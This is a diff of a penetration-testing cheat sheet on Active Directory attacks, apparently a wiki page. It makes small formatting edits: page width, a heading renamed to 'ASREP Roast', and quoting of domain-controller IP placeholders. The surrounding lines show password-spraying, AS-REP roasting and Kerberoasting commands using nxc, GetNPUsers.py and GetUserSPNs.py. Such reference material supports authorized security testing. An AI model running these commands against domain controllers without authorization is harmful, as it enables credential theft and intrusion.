@@ -1,7 +1,6 @@
 ---
-icon: windows
 layout:
-  width: default
+  width: wide
   title:
     visible: true
   description:
@@ -75,7 +74,7 @@ nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-
 ```
 {% endcode %}
 
-### ASREProast <a href="#asreproast" id="asreproast"></a>
+### ASREP Roast <a href="#asreproast" id="asreproast"></a>
 
 {% code overflow="wrap" %}
 ```sh
@@ -93,7 +92,7 @@ GetNPUsers.py <domain>/ -usersfile <users.txt>
 
 {% code overflow="wrap" %}
 ```sh
-GetUserSPNs.py -no-preauth '<asrep_user>' -usersfile <users.txt> -dc-host <dc_ip> <domain>/
+GetUserSPNs.py -no-preauth '<asrep_user>' -usersfile <users.txt> -dc-host '<dc_ip>' <domain>/
 ```
 {% endcode %}
 
@@ -155,7 +154,7 @@ nxc ldap <dc_ip> -u '<user>' -p '<password>' --kerberoasting <output.txt>
 
 {% code overflow="wrap" %}
 ```sh
-GetUserSPNs.py -request -dc-ip <dc_ip> '<domain>/<user>:<password>'
+GetUserSPNs.py -request -dc-ip '<dc_ip>' '<domain>/<user>:<password>'
 ```
 {% endcode %}
 
